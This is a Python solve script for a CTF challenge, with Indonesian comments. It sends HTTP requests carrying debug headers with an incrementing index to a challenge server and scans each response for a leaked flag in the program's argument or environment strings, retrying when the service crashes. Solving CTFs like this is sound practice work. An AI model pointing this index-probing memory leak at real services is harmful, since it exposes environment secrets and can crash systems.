#!/usr/bin/env python3
import re
import socket
import time
from typing import Optional, Tuple

HOST = "gzcli.techcomfest.1pc.tf"
PORT = 33599

# Cukup fleksibel buat kebanyakan CTF: SOMETHING{...}
FLAG_RE = re.compile(rb"[A-Za-z0-9_]{2,}\{[^}\r\n]{4,}\}")

def fetch_idx(idx: int, timeout: float = 5.0) -> Tuple[bytes, bytes]:
    """
    Kirim 1 HTTP request dengan X-Debug dan X-Debug-Index = idx.
    Return (raw_response, body).
    """
    req = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"User-Agent: solve.py\r\n"
        f"X-Debug: true\r\n"
        f"X-Debug-Index: {idx}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    s = socket.create_connection((HOST, PORT), timeout=timeout)
    s.settimeout(timeout)
    s.sendall(req)

    data = b""
    while True:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    s.close()

    # Parse body
    if b"\r\n\r\n" in data:
        _, _, body = data.partition(b"\r\n\r\n")
    else:
        body = b""
    return data, body.strip(b"\r\n\0")

def extract_flag(blob: bytes) -> Optional[bytes]:
    m = FLAG_RE.search(blob)
    return m.group(0) if m else None

def main():
    # Strategi:
    # - coba idx dari 0..MAX
    # - kalau service crash/putus pas idx tertentu (kemungkinan NULL tepat di argc),
    #   kita lanjut idx berikutnya setelah nunggu sebentar.
    MAX = 300

    seen = set()
    for idx in range(0, MAX + 1):
        if idx in seen:
            continue
        seen.add(idx)

        try:
            raw, body = fetch_idx(idx)
        except (ConnectionRefusedError, TimeoutError, OSError):
            # kemungkinan server restart/crash (misal idx == argc -> NULL)
            time.sleep(0.25)
            continue

        if not raw:
            continue

        # Cek flag di body dulu
        flag = extract_flag(body)
        if flag:
            print(flag.decode(errors="replace"))
            return

        # Kadang flag muncul sebagai ENV "FLAG=...." jadi cek body juga full
        flag = extract_flag(raw)
        if flag:
            print(flag.decode(errors="replace"))
            return

        # Debug ringan: tampilkan beberapa output yang “masuk akal”
        # (argv atau envp strings biasanya printable dan pendek)
        if body and all(32 <= b <= 126 for b in body[:80]):
            # optional: uncomment buat lihat progres
            # print(f"[{idx}] {body.decode(errors='replace')}")
            pass

    print("Flag tidak ketemu dalam range idx. Naikkan MAX atau cek respons manual.")

if __name__ == "__main__":
    main()
